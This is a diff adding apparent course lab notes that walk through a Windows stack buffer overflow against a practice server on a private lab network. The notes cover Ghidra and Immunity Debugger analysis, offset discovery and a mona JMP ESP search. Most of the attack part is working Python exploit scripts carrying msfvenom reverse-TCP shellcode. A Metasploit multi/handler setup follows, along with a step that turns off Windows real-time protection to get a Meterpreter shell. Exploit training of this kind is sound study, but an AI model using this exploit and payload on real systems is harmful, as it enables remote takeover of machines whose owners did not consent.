@@ -2346,3 +2346,392 @@ proxychains scp -P2222 comrade@192.168.28.105:/.hidden/inventory2.exe .
 
 3. scp from winops to your linops to get inventory2.exe on GHIDRA
 4.  
+
+
+
+
+
+
+
+# Windows Buffer Overflow
+## DEMO
+
+1. Static Analysis
+
+OPEN Powershell 
+
+RUN strings on 1. secureserverind.exe and 2. essfunc.dll
+
+c:\Users\student\Downloads\Sysinternalssuite\strings.exe {file}
+Determined to be windows from reading the dll and strings from the output of the command above.
+GNU C17 9.2.0 -mtune=generic -march=i586 -g -g -g -O2 -O2 -O2 -fbuilding-libgcc -fno-stack-protector
+From this we can see that we are able to smatch the stack when running it.
+
+RUN Get-Content on the files to see file format
+MZ = Windows Portable Executable
+
+2. Dynamic Analysis
+
+RUN the executable and see what it does. 
+Waiting for client connections.... Means it probably opened a listening port so we can go and "netstat -anob" to see what ports were opened under this executable
+
+OPEN taskmanager --> Performance --> Open Resource Monitor --> Network
+This will allow you to see what ports are open on this machine
+
+RUN ipconfig to get our private IP address and from the LinOPS station we are going to connect via this IP to the port 9999 that was opened from the executable
+
+```
+C:\Windows\System32>ipconfig                                                                                                                                                                                                                    Windows IP Configuration
+Ethernet adapter tap06950435-0a:
+Connection-specific DNS Suffix  . : vta
+Link-local IPv6 Address . . . . . : fe80::21e0:760c:56a5:62c0%4
+IPv4 Address. . . . . . . . . . . : 192.168.65.10
+Subnet Mask . . . . . . . . . . . : 255.255.255.224
+Default Gateway . . . . . . . . . : 192.168.65.30  
+```
+
+RUN nc 192.168.65.10 9999 to the WinOPS Station via the open port. Continue to enumerate what values can be accepted via this NC connection
+```
+student@lin-ops:~$ nc 192.168.65.10 9999
+Welcome to SecureServer! Enter HELP for help.
+```
+
+RUN HELP to see what VALID Commands we can RUN
+```
+student@lin-ops:~$ nc 192.168.65.10 9999
+Welcome to SecureServer! Enter HELP for help.
+HELP
+Valid Commands:
+HELP
+TRUN [value]
+EXIT
+
+```
+
+RUN TRUN {input} to see if we can bypass the buffer to crash the program. We notice that the buffer is quite large so we then move back to WINOPS Station.
+
+RUN GHIDRA and drag secureserverind.exe inside and ANALYZE the program. SEARCH for STRINGS to find the FUNC() that is being used within the PROGRAM
+STRINGS --> Search for a STRING that appeared inside the program... "TRUN" and double click on the function where TRUN is.
+
+Once inside the function we are able to locate the line that has TRUN in it. We notice that he program is _strncmp(arg1,arg2,n).
+
+```
+        if (iVar1 == 0) {
+          pcStack_28 = (char *)_malloc(3000);
+          _memset(pcStack_28,0,3000);
+          for (iStack_14 = 5; iStack_14 < iStack_18; iStack_14 = iStack_14 + 1) {
+            if (pcStack_1c[iStack_14] == '.') {
+              _strncpy(pcStack_28,pcStack_1c,3000);
+              _Function1(pcStack_28);
+              break;
+            }
+
+```
+
+Looking at this we can see that if the first 5 characters of "TRUN " and our arguments are the same it will run this line.
+WE are using pcStack_28 and setting _memset as a buffer of 3000 characters. We can now infer that strncopy is how we are able to perform our buffer overflow
+CLOSE GHIDRA
+
+OPEN Immunity Debugger --> RUN AS Administrator
+IMMUNITY DEBUGGER - [CPU]
+
+FILE --> Attach --> Secureserverind (Has to be running) --> Attach
+Once we attach the immunity debugger pauses the program. We can play with PLAY button at top which allows us to interact with the program. 
+There is also a REWIND Button to start the program over again and interact with it.
+
+
+MOVE To LinOPS to begin working out EXPLOIT using VIM "vim overflow.py" AND chmod 755 it.
+```
+#!/usr/bin/env python
+import socket
+
+buf = "TRUN /.:/"
+buf += ""
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.65.10", 9999))
+
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+
+s.close()
+
+```
+
+FROM HERE We need to find out offset using WIREMASK.EU copy pattern that is above our BUFFER of 2008 and paste it into our script
+
+```
+buf += "{PATTERN FROM WIREMASK}"
+```
+
+Write and QUIT then CHMOD u+x overflow.py...
+
+
+RUN YOUR OVERFLOW.PY effectively sending your buffer from WIREMASK to the SecureServer Connection
+
+LINOPS:
+```
+student@lin-ops:~$ ./overflow.py 
+Welcome to SecureServer! Enter HELP for help.
+
+```
+
+WINOPS:
+From IMMUNITY DEBUGGER we should see a PAUSED program and ERROR_SUCCESS within the TOP RIGHT PANE
+COPY the EIP VALUE from this window and PASTE it into WIREMASK to get the absolute buffer of "2003"
+```
+WIREMASK.EU
+
+Registery Value				OFFSET
+386F4337                                2003
+
+```
+
+NOW GO back to VIM and add the proper buffer set as 2003 and set "BBBB" to correctly identify if the 2003 Buffer is Correct
+```
+#!/usr/bin/env python
+import socket
+buf = "TRUN /.:/"
+buf += "A" * 2003
+buf += "BBBB"
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.65.10", 9999))
+
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+
+s.close()
+
+```
+
+Restart in IMMUNITY DEBUGGER AND Run your SCRIPT to see if the EIP is being overwritten with BBBB
+From inside IMMUNITY we can see the EIP is 42424242 which is BBBB in hex so the script worked
+
+NOW we need to find the JMP ESP LOCATIONS. Inside IMMUNITY bottom left pane search "!mona modules"
+WINDOW --> LOG DATA
+Bringing up a LOG DATA WINDOW
+FROM HERE we can see Log data, item 75 Address=62500000 Message=Modules C:\Users\student\Desktop\essfunc.dll
+USING MONA we can look through essfunc.dll to find JMP and ESP locations
+```
+!mona jmp -r esp -m "essfunc.dll"
+```
+
+Go back to LOG DATA from WINDOW --> LOGDATA Window and we will see all the JMP ESP LOCATIONS
+We have 9 pointers to JMP ESP
+
+We are going to grab the first four JMP ESP pointers and COPY them into our SCRIPT 
+
+BREAK THEM APART AND REVERSE THEM
+
+```
+#!/usr/bin/env python
+import socket
+buf = "TRUN /.:/"
+buf += "A" * 2003
+buf += "BBBB"
+
+
+#0x625012a0 --> 62 50 12 a0 --> "\xa0\x12\x50\x62"
+#0x625012ad --> 62 50 12 ad --> "\xad\x12\x50\x62"
+#0x625012ba --> 62 50 12 ba --> "\xba\x12\x50\x62"
+#0x625012c7 --> 62 50 12 c7 --> "\xc7\x12\x50\x62"
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.65.10", 9999))
+
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+
+s.close()
+
+```
+
+
+NOW THAT we have our JMP and ESP memory locations in our SCRIPT properly formatted 
+WE CAN GRAB the FIRST ESP LOCATION and COPY IT TO where we had our "BBBB"
+
+```
+#!/usr/bin/env python
+import socket
+buf = "TRUN /.:/"
+buf += "A" * 2003
+buf += "\xa0\x12\x50\x62"
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.65.10", 9999))
+
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+
+s.close()
+
+
+```
+
+CREATE PAYLOAD USING MSFVENOM
+
+```
+msfvenom -p windows/shell/reverse_tcp lhost={LinOPS PRIVATE IP} lport={RHP} -b "\x00" -f python 
+
+msfvenom -p windows/shell/reverse_tcp lhost=192.168.65.20 lport=44421 -b "\x00" -f python
+
+```
+
+COPY PAYLOAD (Everything minus the first line)
+PASTE Shellcode under JMP memory ADDRESS and NOP SLED
+
+```
+#!/usr/bin/env python
+import socket
+buf = "TRUN /.:/"
+buf += "A" * 2003
+buf += "\xa0\x12\x50\x62"
+buf += "\x90" * 15
+buf += b"\xb8\xca\x01\xb1\xc5\xdb\xc8\xd9\x74\x24\xf4\x5a"
+buf += b"\x29\xc9\xb1\x59\x31\x42\x14\x03\x42\x14\x83\xc2"
+buf += b"\x04\x28\xf4\x4d\x2d\x23\xf7\xad\xae\x5b\xc9\x7f"
+buf += b"\xca\x10\x7b\xb0\x9a\xc3\xf7\xe2\x90\x80\x5a\x17"
+buf += b"\x22\xe4\x72\x18\x83\x42\xa5\x17\x14\x63\x69\xfb"
+buf += b"\xd6\xe2\x15\x06\x0b\xc4\x24\xc9\x5e\x05\x60\x9f"
+buf += b"\x15\xea\x3c\x77\x5d\xa6\xd0\xfc\x23\x7a\xd0\xd2"
+buf += b"\x2f\xc2\xaa\x57\xef\xb6\x06\x59\x20\x66\x1c\x11"
+buf += b"\xd8\x0d\x7a\x82\xd9\xc2\xfe\x0b\xad\xd8\x49\x07"
+buf += b"\x7a\xab\x4b\xc1\xb2\x54\x7a\x2d\x18\x6b\xb2\xa0"
+buf += b"\x60\xac\x75\x5b\x17\xc6\x85\xe6\x20\x1d\xf7\x3c"
+buf += b"\xa4\x81\x5f\xb6\x1e\x65\x61\x1b\xf8\xee\x6d\xd0"
+buf += b"\x8e\xa8\x71\xe7\x43\xc3\x8e\x6c\x62\x03\x07\x36"
+buf += b"\x41\x87\x43\xec\xe8\x9e\x29\x43\x14\xc0\x96\x3c"
+buf += b"\xb0\x8b\x35\x2a\xc4\x74\xc6\x53\x98\xe2\x0a\x9e"
+buf += b"\x23\xf2\x04\xa9\x50\xc0\x8b\x01\xff\x68\x43\x8c"
+buf += b"\xf8\xf9\x43\x2f\xd6\x41\x03\xd1\xd7\xb1\x0d\x16"
+buf += b"\x83\xe1\x25\xbf\xac\x6a\xb6\x40\x79\x06\xbc\xd6"
+buf += b"\x42\x7e\x81\x32\x2b\x7c\x02\xef\x9a\x09\xe4\x5f"
+etc.......
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.65.10", 9999))
+
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+
+s.close()
+```
+
+
+Now RUN MSFCONSOLE we have to make a MULTIHANDLER
+```
+msfconsole
+
+msf6> use multi/handler
+
+msf6 exploit(multi/handler) > show options
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0
+LHOST => 0.0.0.0
+
+msf6 exploit(multi/handler) > set LPORT 54321 {Same as RHP used in msfvenom}
+LPORT => 54321
+
+```
+
+
+WRITE SCRIPT... CLOSE
+WINOPS --> RESTART PROGRAM and PLAY
+Go to WINDOWS and turn off WINDOWS PROTECTION so METERPRETER WORKS
+Virus Threat Protection --> Manage Settings --> Turn OFF Real-Time Protection
+We are ready to run MULTIHANDLER
+
+
+## FINAL STEPS:
+
+1. We need MULITHANDLER RUNNING before ANYTHING ELSE
+```
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 0.0.0.0:54321
+```
+
+2. Run PYTHON SCRIPT if SUCCESSFUL we will see something in MULTI/HANDLER
+```
+#!/usr/bin/env python
+import socket
+buf = "TRUN /.:/"
+buf += "A" * 2003
+buf += "\xa0\x12\x50\x62"
+buf += "\x90" * 15
+buf += b"\xbd\xdc\x34\x07\xbe\xd9\xc6\xd9\x74\x24\xf4\x5e"
+buf += b"\x29\xc9\xb1\x59\x31\x6e\x14\x03\x6e\x14\x83\xc6"
+buf += b"\x04\x3e\xc1\xfb\x56\x31\x2a\x04\xa7\x2d\xa2\xe1"
+buf += b"\x96\x7f\xd0\x62\x8a\x4f\x92\x27\x27\x24\xf6\xd3"
+buf += b"\x38\x8d\xbd\xfd\x77\x0e\xca\x70\x50\xc1\x0d\xd8"
+buf += b"\x9c\x40\xf2\x23\xf1\xa2\xcb\xeb\x04\xa3\x0c\xba"
+buf += b"\x63\x4c\xc0\xb6\xde\x82\x6e\x8a\xe2\xa3\xa0\x5c"
+buf += b"\x90\xe3\x38\xe6\x66\x97\xf4\xe9\xb6\xdc\x4d\xf2"
+buf += b"\xbd\xba\x6d\x03\x11\x6a\xeb\xca\xe1\xb6\xba\xfd"
+buf += b"\xf6\x4d\x08\x75\x09\x87\x40\x49\xa6\xe6\x6c\x44"
+buf += b"\xb6\x2f\x4a\xb7\xcd\x5b\xa8\x4a\xd6\x98\xd2\x90"
+buf += b"\x53\x3e\x74\x52\xc3\x9a\x84\xb7\x92\x69\x8a\x7c"
+buf += b"\xd0\x35\x8f\x83\x35\x4e\xab\x08\xb8\x80\x3d\x4a"
+buf += b"\x9f\x04\x65\x08\xbe\x1d\xc3\xff\xbf\x7d\xab\xa0"
+buf += b"\x65\xf6\x5e\xb6\x1a\xf7\xa0\xb7\x46\x6f\x6c\x7a"
+buf += b"\x79\x6f\xfa\x0d\x0a\x5d\xa5\xa5\x84\xed\x2e\x60"
+buf += b"\x52\x64\x38\x93\x8c\xce\x29\x6d\x2d\x2e\x63\xaa"
+buf += b"\x79\x7e\x1b\x1b\x02\x15\xdb\xa4\xd7\x83\xd1\x32"
+....
+
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.65.10", 9999))
+
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+
+s.close()
+```
+
+3. We now have a METERPRETER SHELL present in the MULTI/HANDLER Window
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
